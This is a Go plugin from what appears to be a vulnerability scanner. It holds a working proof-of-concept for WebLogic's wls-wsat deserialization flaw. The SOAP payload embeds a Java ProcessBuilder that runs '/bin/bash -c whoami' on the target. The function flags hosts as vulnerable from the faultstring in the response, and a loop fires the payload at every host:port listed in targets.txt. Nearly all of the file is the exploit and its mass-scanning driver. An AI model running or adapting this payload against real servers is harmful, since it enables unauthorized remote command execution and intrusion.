package Plugins

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strings"
)

func poc3506(u string) (int, string) {
	url := "http://" + u + "/wls-wsat/CoordinatorPortType"
	postStr := `
	<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
	  <soapenv:Header>
		<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
		  <java>
			<object class="java.lang.ProcessBuilder">
			  <array class="java.lang.String" length="3">
				<void index="0">
				  <string>/bin/bash</string>
				</void>
				<void index="1">
				  <string>-c</string>
				</void>
				<void index="2">
				  <string>whoami</string>
				</void>
			  </array>
			  <void method="start"/>
			</object>
		  </java>
		</work:WorkContext>
	  </soapenv:Header>
	  <soapenv:Body/>
	</soapenv:Envelope>
	`

	client := &http.Client{}
	req, err := http.NewRequest("POST", url, strings.NewReader(postStr))
	if err != nil {
		return 0, fmt.Sprintf("[-] [%s] Error creating request: %v", u, err)
	}

	for key, value := range HEADERS {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		return 0, fmt.Sprintf("[-] [%s] Request error: %v", u, err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return 0, fmt.Sprintf("[-] [%s] Error reading response body: %v", u, err)
	}

	response := string(body)
	match := regexp.MustCompile("<faultstring>.*</faultstring>").FindString(response)

	if match != "" {
		return 1, fmt.Sprintf("[+] 存在漏洞 %s ", VUL[3])
	} else {
		return 0, fmt.Sprintf("[-] 已扫描 %s ", VUL[3])
	}
}

func run3506(rip string, rport int) (int, string) {
	url := fmt.Sprintf("%s:%d", rip, rport)
	return poc3506(url)
}

func Check3506() {
	filePath := "targets.txt"

	file, err := os.Open(filePath)
	if err != nil {
		fmt.Printf("无法打开文件：%s\n", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			parts := strings.Split(line, ":")
			if len(parts) != 2 {
				fmt.Printf("无效的目标格式：%s\n", line)
				continue
			}

			targetHost := parts[0]
			targetPort := parts[1]

			// 将端口转换为整数
			var portInt int
			_, err := fmt.Sscanf(targetPort, "%d", &portInt)
			if err != nil {
				fmt.Printf("无效的端口：%s\n", targetPort)
				continue
			}
			_, resultMsg := run3506(targetHost, portInt)
			fmt.Println(resultMsg)

		}
	}
}
